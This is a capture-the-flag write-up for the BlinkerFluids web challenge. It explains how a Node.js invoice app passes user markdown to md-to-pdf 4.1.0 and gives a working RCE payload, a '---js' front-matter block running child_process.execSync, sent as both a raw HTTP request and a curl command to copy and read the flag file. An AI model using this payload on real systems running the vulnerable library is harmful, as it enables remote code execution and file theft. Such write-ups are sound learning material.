## BlinkerFluids

> Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?

---

The target is a Docker web application. We have access to its source code.

Its a Node.js application that interacts with a SQLite databsae. The database contains a single table: `invoices`. The table is created and initialized via the following statements:

```sql
DROP TABLE IF EXISTS invoices;
CREATE TABLE invoices (
	id           INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,
	invoice_id   VARCHAR(255) NOT NULL,
	created      VARCHAR(255) DEFAULT CURRENT_TIMESTAMP
);
INSERT INTO invoices (invoice_id) VALUES ('f0daa85f-b9de-4b78-beff-2f86e242d6ac');
```

All four functions used to interact with the database appear to utilize prepared statements.

The application has three routes:

- `GET /` renders `index.html`
- `GET /api/invoices/list` retrieves all the invoice objects from the database
- `POST /api/invoice/delete`
	- Takes a JSON object with an `invoice_id` key and deletes the corresponding invoice from the database
- `POST /api/invoice/add`
	- Takes a JSON object with a `markdown_content` key
	- Pass `markdown_content` to `MDHelper.makePDF()`
		- Passes `markdown_content` to `md-to-pdf` 4.1.0's `mdToPdf`, which uses the [grey-matter](https://www.npmjs.com/package/gray-matter) library to parse `markdown_content` without disabling the JavaScript engine, opening up an [RCE vulnerability](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880).

The following requests exploits the vulnerability to copy the flag file to `/static/invoices/flag.txt`, where it can subsequently be read.

```http
POST /api/invoice/add HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://localhost:1337
Content-Length: 125
Connection: close

{"markdown_content":"---js\n((require(\"child_process\")).execSync(\"cp /flag.txt /app/static/invoices/flag.txt\"))\n---RCE"}
```

```bash
$ curl -i -s -k -X $'POST' \
    -H $'Host: localhost:1337' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://localhost:1337/' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 125' -H $'Connection: close' \
    --data-binary $'{\"markdown_content\":\"---js\\n((require(\\\"child_process\\\")).execSync(\\\"cp /flag.txt /app/static/invoices/flag.txt\\\"))\\n---RCE\"}' \
    $'http://localhost:1337/api/invoice/add'
```

```bash
$ curl http://localhost:1337/static/invoices/flag.txt
HTB{...}
```
